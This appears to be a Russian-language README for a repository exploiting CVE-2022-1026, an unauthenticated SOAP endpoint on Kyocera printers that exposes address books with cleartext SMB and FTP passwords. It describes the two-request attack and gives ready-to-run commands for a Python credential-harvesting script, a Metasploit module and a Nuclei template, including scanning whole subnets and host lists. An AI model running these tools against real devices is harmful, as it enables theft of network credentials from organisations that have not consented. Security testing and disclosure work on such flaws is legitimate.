# CVE-2022-1026 — Kyocera MFP Address Book Exposure

Уязвимость в Kyocera MFP: SOAP API на порту 9091/TCP не требует аутентификации и позволяет
извлечь адресную книгу с учётными данными в открытом виде — логины и пароли от SMB-шар,
FTP-серверов, email-адреса.

**CVSS 8.6** · `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N`

Оригинальный writeup: https://www.rapid7.com/blog/post/2022/03/29/cve-2022-1026-kyocera-net-view-address-book-exposure/  
Оригинальный PoC: https://github.com/ac3lives/kyocera-cve-2022-1026

---

## Быстрый старт

```bash
# 1. Распакуй архив
unzip kyocera-cve-2022-1026.zip && cd kyocera-cve-2022-1026

# 2. Установи зависимости
./install.sh

# 3. Запускай
./run_python.sh  10.0.0.10
./run_msf.sh     10.0.0.10
./run_nuclei.sh  10.0.0.10
```

---

## Как работает

Скрипт выполняет два SOAP-запроса к `https://<ip>:9091/ws/km-wsdl/setting/address_book`:

1. `create_personal_address_enumeration` — принтер создаёт экспорт адресной книги и возвращает токен
2. Пауза 5 секунд (пока книга генерируется)
3. `get_personal_address_list` — получаем книгу целиком с паролями в открытом виде

---

## Python-скрипт

```bash
./run_python.sh 10.0.0.10

# несколько хостов
./run_python.sh 10.0.0.10,10.0.0.20 -i 10.0.0.30

# из файла (один IP в строке)
./run_python.sh -f ips.txt

# сохранить результат в файл
./run_python.sh 10.0.0.10 -o result.txt
```

Или напрямую:

```bash
python3 getKyoceraCreds.py 10.0.0.10
python3 getKyoceraCreds.py -f ips.txt -o result.txt
```

---

## Metasploit

Модуль загружается прямо из репозитория — копировать ничего не нужно:

```bash
./run_msf.sh 10.0.0.10

# подсеть
./run_msf.sh 10.0.0.0/24

# с дополнительными опциями
./run_msf.sh 10.0.0.10 "set WAIT 10"
```

Или вручную:

```bash
msfconsole -q -m /path/to/kyocera-cve-2022-1026 \
  -x "use auxiliary/gather/kyocera_address_book; set RHOSTS 10.0.0.10; run; exit"
```

Модуль сохраняет сырой XML-ответ в loot (`kyocera.address_book.xml`).

---

## Nuclei (v3+)

```bash
./run_nuclei.sh 10.0.0.10

# список хостов (один IP в строке, порт указывать не нужно)
./run_nuclei.sh ips.txt

# сохранить результат в JSON
./run_nuclei.sh ips.txt -o results.json -json
```

Или напрямую:

```bash
nuclei -t CVE-2022-1026.yaml -u https://10.0.0.10:9091
nuclei -t CVE-2022-1026.yaml -l ips.txt
```

> Целевой URL должен включать схему и порт: `https://<ip>:9091`

---

## Протестированные модели

- ECOSYS M2640idw
- TASKalfa 406ci

Проблема не исправлена на всех моделях несмотря на уведомление вендора.

---

## Структура репозитория

```
├── getKyoceraCreds.py          — основной Python-скрипт
├── kyocera_address_book.rb     — Metasploit auxiliary-модуль
├── CVE-2022-1026.yaml          — Nuclei-шаблон
├── install.sh                  — установка зависимостей
├── run_python.sh               — запуск Python-скрипта
├── run_msf.sh                  — запуск через msfconsole
├── run_nuclei.sh               — запуск через nuclei
└── auxiliary/gather/
    └── kyocera_address_book.rb — симлинк (создаётся install.sh)
```
